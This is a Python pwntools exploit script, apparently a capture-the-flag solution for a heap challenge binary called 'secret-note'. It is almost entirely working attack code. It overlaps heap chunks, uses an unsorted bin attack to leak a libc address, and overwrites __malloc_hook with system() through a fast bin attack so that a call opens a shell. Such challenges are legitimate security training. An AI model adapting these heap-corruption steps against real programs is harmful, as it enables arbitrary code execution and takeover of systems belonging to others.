from pwn import *

fname = 'secret-note'
io = process(fname)
#io = remote('127.0.0.1', 33652)

context.log_level='debug'

def getpid(name):
    pid = pwnlib.util.proc.pidof(name)
    log.info(str(pid))
    raw_input('continue')

def create(index, size, content):
    io.recvuntil('>')
    io.sendline('1')
    io.recvline()
    io.sendline(str(index))
    io.recvline()
    io.sendline(str(size))
    io.recvline()
    io.sendline(content)
    io.recvuntil('added')

def edit(index, content):
    io.recvuntil('>')
    io.sendline('2')
    io.recvline()
    io.sendline(str(index))
    io.recvline()
    io.sendline(content)
    io.recvuntil('edited')

def delete(index):
    io.recvuntil('>')
    io.sendline('4')
    io.recvline()
    io.sendline(str(index))
    io.recvuntil('deleted')

def main():
    getpid(fname)

    # overlap
    create(0, 0x1f8, 'AAAA')
    create(1, 0x68, 'DDDD')
    create(2, 0x1f8, 'AAAA')
    create(3, 0x1f8, 'AAAA')
    create(4, 0x1f8, 'AAAA')

    delete(0)
    edit(2, 'A' * 0x1f0 + p64(0x470)) 
    delete(3)
    
    # unsorted bin attack
    # bss array addr: 0x6020E0
    create(0, 0x668, 'B'*0x1f8 + p64(0x71) + 'D'*0x68 + p64(0x201) + 'B'*0x1f8 + p64(0x201))
    delete(2)
    edit(0, 'B'*0x1f8 + p64(0x71) + 'D'*0x68 + p64(0x201) + p64(0x602060-8) * 2)
    create(2, 0x1f8, 'CCCC')

    # leak
    io.recvuntil('>')
    io.sendline('3')
    io.recvuntil('size: ')
    #sizestr = io.recvuntil(' time')[:-5]
    sizestr = io.recvline()[:-1]
    print(sizestr)
    bin_addr = int(sizestr)
    # bin_addr = 0x7f3e46cdbb78
    # malloc_hook = 0x7f3e46cdbb10
    malloc_hook = bin_addr - 0x68
    attack_addr = malloc_hook - 0x28 + 0x5
    libc_base = malloc_hook - (0x7ffff7dd1b10 - 0x00007ffff7a0d000)
    system_addr = libc_base + 0x0000000000045390 
    binsh_addr = libc_base + 0x18cd17

    # fast bin attack
    delete(1)
    edit(0, 'B'*0x1f8 + p64(0x71) + p64(attack_addr)*2) 
    create(5, 0x68, 'DDDD')
    create(6, 0x68, '\0'*0x10 + '\0'*3 + p64(system_addr)*3)

    # get shell
    io.recvuntil('>')
    io.sendline('1')
    io.recvline()
    io.sendline('7')
    io.recvline()
    io.sendline(str(binsh_addr))
    io.interactive()


if __name__ == '__main__':
    main()
    

